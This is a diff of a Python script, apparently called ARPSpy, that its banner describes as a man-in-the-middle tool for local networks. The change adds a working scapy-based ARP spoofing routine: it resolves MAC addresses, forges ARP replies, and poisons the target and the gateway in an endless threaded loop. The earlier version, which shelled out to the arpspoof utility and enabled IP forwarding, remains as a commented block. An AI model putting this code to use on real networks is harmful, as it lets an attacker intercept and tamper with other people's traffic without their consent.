@@ -1,4 +1,4 @@
-import socket, sys, os, re, nmap3, logging
+import socket, sys, os, re, nmap3, logging, threading
 from termcolor import colored
 from scapy.all import *
 from datetime import datetime
@@ -13,16 +13,16 @@ print(colored('''
    / /\ \   |  _  /  |  ___/   \___ \  |  ___/    \   /  
   / ____ \  | | \ \  | |       ____) | | |         | |   
  /_/    \_\ |_|  \_\ |_|      |_____/  |_|         |_|   
-                                                         
-                                                         
+
+
 
 ''', "white"))
-
 
 print(colored("----------------------------------------------------------------------------------------", "green"))
 print(colored("[+] Author: LE TRONG HOANG MINH (MINH ITACHI)", "magenta"))
 print(colored("[+] Starting script at: " + str(datetime.now()), "magenta"))
-print(colored("[+] ARPSpy - a lightweight tool to perform MITM attack on local network (educational purpose only)", "magenta"))
+print(colored("[+] ARPSpy - a lightweight tool to perform MITM attack on local network (educational purpose only)",
+              "magenta"))
 print(colored("----------------------------------------------------------------------------------------", "green"))
 
 # Check root user
@@ -122,7 +122,9 @@ def chooseHostToAttack(listOfHosts):
 
     choice = ""
     while choice != "n" and choice != "N":
-        choice = input(colored("[-] Do you want to perform OS detection scanning on any host(Increase chance to find right target)?(Y/N): ", "yellow"))
+        choice = input(colored(
+            "[-] Do you want to perform OS detection scanning on any host(Increase chance to find right target)?(Y/N): ",
+            "yellow"))
         if choice == "Y" or choice == "y":
             hostToScan = input(colored("[-] Host to scan (may take a few minutes): ", "yellow"))
             while hostToScan not in listOfHosts:
@@ -171,7 +173,8 @@ def OSScan(host):
                     port["service"][
                         "name"] + " - State: " + port["state"], "blue"))
     except:
-        print(colored("[!] Error happened in scanning device, please try again with another device or skip this step", "red"))
+        print(colored("[!] Error happened in scanning device, please try again with another device or skip this step",
+                      "red"))
 
 
 target, gateway = chooseHostToAttack(listOfHosts)
@@ -180,17 +183,47 @@ print(colored("[+] Gateway specified: " + gateway, "green"))
 print(colored("----------------------------------------------------------------------------------------", "green"))
 
 
-def arpspoof(target, gateway, iface):
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # enable port forwarding
-    os.system("arpspoof -t " + gateway + " " + target + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the target
-    os.system("arpspoof -t " + target + " " + gateway + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the gateway
+def get_mac(ip):
+    try:
+        arp_request = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
+        return answered_list[0][1].hwsrc
+    except:
+        return "ff:ff:ff:ff:ff:ff"
 
 
+def spoof(target_ip, spoof_ip):
+    try:
+        packet = ARP(op=2, pdst=target_ip,
+                     hwdst=get_mac(target_ip),
+                     psrc=spoof_ip)
+
+        send(packet, verbose=False)
+    except:
+        pass
+
+def arpspoof(target, gateway):
+    while True:
+        spoof(target, gateway)
+        spoof(gateway, target)
+
+
+# def arpspoof(target, gateway, iface):
+#     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # enable port forwarding
+#     os.system(
+#         "arpspoof -t " + gateway + " " + target + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the target
+#     os.system(
+#         "arpspoof -t " + target + " " + gateway + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the gateway
+
+arpspoofThread = threading.Thread(target=arpspoof, args=(target, gateway))
+arpspoofThread.start()
 iface = input(colored("[-] Input your network interface to sniff ('ifconfig' or 'ip a' command on Linux): ", "yellow"))
 print(colored("[-] Enabling IPv4 Port Forwarding...", "yellow"))
 print(colored("[-] Spoofing target and gateway...", "yellow"))
 
-arpspoof(target, gateway, iface)
+
 print(colored("----------------------------------------------------------------------------------------", "green"))
 
 
